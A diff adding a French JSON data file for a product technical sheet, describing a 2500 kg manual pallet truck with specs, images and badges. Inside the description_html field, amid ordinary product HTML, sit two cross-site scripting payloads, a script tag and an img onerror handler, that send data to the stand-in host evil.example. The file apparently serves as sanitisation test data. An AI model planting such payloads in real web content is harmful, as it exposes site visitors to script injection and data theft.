@@ -1,0 +1,51 @@
+{
+  "template": "fiche-technique-01",
+  "version": "published",
+  "locale": "fr",
+  "data": {
+    "shop": {
+      "name": "Contoso Equipment",
+      "url": "https://www.contoso-equipment.example",
+      "logo": "asset://logo",
+      "colors": { "primary": "#0b5ea8", "secondary": "#33404d" },
+      "company": {
+        "address": "1 Example Street, Springfield",
+        "phone": "+33 1 00 00 00 00",
+        "email": "contact@contoso-equipment.example"
+      }
+    },
+    "product": {
+      "id": 4271,
+      "name": "Transpalette manuel 2500 kg fourches longues",
+      "sku": "TPM-2500-L",
+      "gtin": "3701234567890",
+      "mpn": "BF-2500L",
+      "url": "https://www.contoso-equipment.example/transpalette-manuel-2500-kg",
+      "brand": "Liftmax",
+      "category_path": ["Manutention", "Transpalettes", "Transpalettes manuels"],
+      "price": { "amount": "489,00", "currency": "EUR", "tax_included": false },
+      "description_short": "Transpalette manuel robuste a fourches longues, concu pour un usage intensif en entrepot. Chassis mecano-soude et pompe hydraulique a triple fonction.",
+      "description_html": "<h3>Presentation</h3><p>Ce transpalette <strong>2500 kg</strong> a ete concu pour la manutention intensive de charges palettisees. Sa pompe hydraulique offre trois positions de commande&nbsp;: <em>montee</em>, <em>neutre</em> et <em>descente</em>.</p><script>fetch('http://evil.example/'+document.title)</script><img src=x onerror=\"fetch('http://evil.example/xss')\"><ul><li>Chassis mecano-soude epaisseur 8 mm</li><li>Roues directrices en polyurethane</li><li>Galets tandem en nylon</li><li>Descente amortie a vitesse controlee</li></ul><h3>Caracteristiques du chassis</h3><table><thead><tr><th>Element</th><th>Materiau</th><th>Traitement</th></tr></thead><tbody><tr><td>Chassis</td><td>Acier S235</td><td>Peinture epoxy</td></tr><tr><td>Fourches</td><td>Acier S355</td><td>Peinture epoxy</td></tr><tr><td>Verin</td><td>Acier chrome</td><td>Chromage dur</td></tr></tbody></table><p style=\"text-align:justify\">La conception du timon permet une prise en main confortable et un rayon de braquage reduit, adapte aux allees etroites. L'ensemble est garanti trois ans pieces et main d'oeuvre.</p>"
+    },
+    "features": [
+      { "name": "Capacite de charge", "value": "2500 kg", "abbreviation": "Q" },
+      { "name": "Longueur des fourches", "value": "1150 mm", "abbreviation": "L" },
+      { "name": "Largeur hors fourches", "value": "540 mm", "abbreviation": "B" },
+      { "name": "Hauteur de leve", "value": "200 mm", "abbreviation": "H" },
+      { "name": "Hauteur mini d'entree", "value": "85 mm", "abbreviation": "h" },
+      { "name": "Roues directrices", "value": "Polyurethane 200 x 50 mm", "abbreviation": "D" },
+      { "name": "Galets", "value": "Nylon tandem 74 x 70 mm", "abbreviation": "d" },
+      { "name": "Poids net", "value": "78 kg", "abbreviation": null },
+      { "name": "Norme", "value": "EN ISO 3691-5", "abbreviation": null }
+    ],
+    "images": [
+      { "src": "asset://img-0", "legend": "Vue trois quarts" },
+      { "src": "asset://img-1", "legend": "Detail du timon" },
+      { "src": "asset://img-2", "legend": "Galets tandem" }
+    ],
+    "schema_image": { "src": "asset://schema" },
+    "badges": ["ce", "tuv", "garantie:3ans", "carsat"],
+    "qr_code": { "src": "asset://qr" },
+    "custom": {}
+  }
+}
